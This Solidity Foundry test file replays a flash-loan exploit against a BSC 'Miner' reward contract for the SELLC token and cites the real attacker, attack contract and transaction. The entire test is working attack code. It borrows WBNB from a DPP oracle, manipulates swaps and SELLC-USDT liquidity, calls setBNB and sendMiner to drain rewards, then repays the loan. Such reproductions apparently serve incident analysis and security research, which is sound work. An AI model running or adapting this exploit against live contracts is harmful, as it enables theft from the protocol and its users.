// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : unclear US$
// Attacker : https://bscscan.com/address/0x0060129430df7ea188be3d8818404a2d40896089
// Attack Contract : https://bscscan.com/address/0x2cc392c0207d080aec0befe5272659d3bb8a7052
// Vulnerable Contract : https://bscscan.com/address/0x84Be9475051a08ee5364fBA44De7FE83a5eCC4f1
// Attack Tx : https://bscscan.com/tx/0xe968e648b2353cea06fc3da39714fb964b9354a1ee05750a3c5cc118da23444b

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x84Be9475051a08ee5364fBA44De7FE83a5eCC4f1#code

// @Analysis
// Twitter Guy : https://twitter.com/EoceneSecurity/status/1668468933723328513

interface Miner {
    function setBNB(address token, address token1) external payable;
    function sendMiner(address token) external;
}

contract ContractTest is Test {
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 SELLC = IERC20(0xa645995e9801F2ca6e2361eDF4c2A138362BADe4);
    Miner miner = Miner(0x84Be9475051a08ee5364fBA44De7FE83a5eCC4f1);
    Uni_Pair_V2 SELLC_USDT = Uni_Pair_V2(0x9523B023E1D2C490c65D26fad3691b024d0305D7);
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IDPPOracle oracle = IDPPOracle(0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 29_005_754);
        cheats.label(address(WBNB), "WBNB");
        cheats.label(address(USDT), "USDT");
        cheats.label(address(SELLC), "SELLC");
        cheats.label(address(SELLC_USDT), "SELLC_USDT");
        cheats.label(address(Router), "Router");
        WBNB.approve(address(Router), type(uint256).max);
        USDT.approve(address(Router), type(uint256).max);
        SELLC.approve(address(Router), type(uint256).max);
        SELLC_USDT.approve(address(Router), type(uint256).max);
    }

    function testExploit() public {
        miner.setBNB{value: 0.01 ether}(address(SELLC), address(USDT));
        cheats.warp(block.timestamp + 1 * 86_400 + 1);
        oracle.flashLoan(600 * 1e18, 0, address(this), new bytes(1));
        emit log_named_decimal_uint(
            "[End] Attacker WBNB balance after exploit", WBNB.balanceOf(address(this)), WBNB.decimals()
        );
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(SELLC);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            200 * 1e18, 0, path, address(this), block.timestamp
        );
        path[0] = address(SELLC);
        path[1] = address(USDT);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            SELLC.balanceOf(address(this)) * 1 / 100, 0, path, address(this), block.timestamp
        );
        Router.addLiquidity(
            address(SELLC),
            address(USDT),
            SELLC.balanceOf(address(this)),
            USDT.balanceOf(address(this)),
            0,
            0,
            address(this),
            block.timestamp
        ); // add SELLC-USDT Liquidity
        path[0] = address(WBNB);
        path[1] = address(SELLC);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            400 * 1e18, 0, path, address(this), block.timestamp
        );
        miner.sendMiner(address(SELLC));
        Router.removeLiquidity(
            address(SELLC), address(USDT), SELLC_USDT.balanceOf(address(this)), 0, 0, address(this), block.timestamp
        ); // remove SELLC-USDT Liquidity
        path[0] = address(SELLC);
        path[1] = address(WBNB);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            SELLC.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
        WBNB.transfer(address(oracle), 600 * 1e18);
    }
}
